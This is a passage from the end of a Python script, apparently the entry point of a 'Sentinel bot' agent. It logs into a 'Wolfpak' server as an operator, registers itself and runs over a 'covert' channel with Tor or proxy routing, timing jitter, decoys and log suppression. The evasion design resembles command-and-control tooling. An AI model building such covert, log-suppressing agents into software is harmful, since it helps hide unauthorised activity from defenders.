    parser.add_argument("--username", "-u",
                        help="Wolfpak username (or prompted interactively)")
    parser.add_argument("--password", "-p",
                        help="Wolfpak password (or prompted interactively)")
    parser.add_argument("--verbose", "-v", action="store_true")
    parser.add_argument(
        "--proxy",
        help="Proxy URL for covert routing (e.g. socks5://127.0.0.1:9050, http://proxy:8080)",
    )
    parser.add_argument(
        "--tor", action="store_true",
        help="Route via Tor (auto-detect SOCKS5 on 9050/9150)",
    )
    parser.add_argument(
        "--stealth", action="store_true",
        help="Maximum stealth: long jitter, extra decoys, total log suppression",
    )
    parser.add_argument(
        "--no-jitter", action="store_true",
        help="Disable random timing delays (faster but more detectable)",
    )

    args = parser.parse_args()
    logging.basicConfig(
        level=logging.DEBUG if args.verbose else logging.INFO,
        format="%(asctime)s [%(levelname)s] %(name)s: %(message)s",
    )

    # Build covert comms channel
    comms = build_comms(
        proxy=args.proxy or "",
        use_tor=args.tor,
        jitter=not args.no_jitter,
        stealth=args.stealth,
    )

    # Authenticate (also through covert channel)
    auth = _authenticate(args.base, args.key, args.username, args.password)
    logger.info("Operator: %s | Role: %s",
                auth.get("operator"), auth.get("role"))

    # Get agent ID and register
    agent_id = _get_agent_id()
    _register(args.base, args.key, agent_id)

    cs = comms.status()
    logger.info("Sentinel bot %s starting | covert: proxy=%s jitter=%s stealth=%s",
                agent_id, cs["proxy"], cs["jitter"], args.stealth)
    asyncio.run(run_sentinel(args.base, args.key, agent_id, comms=comms))


if __name__ == "__main__":
    main()
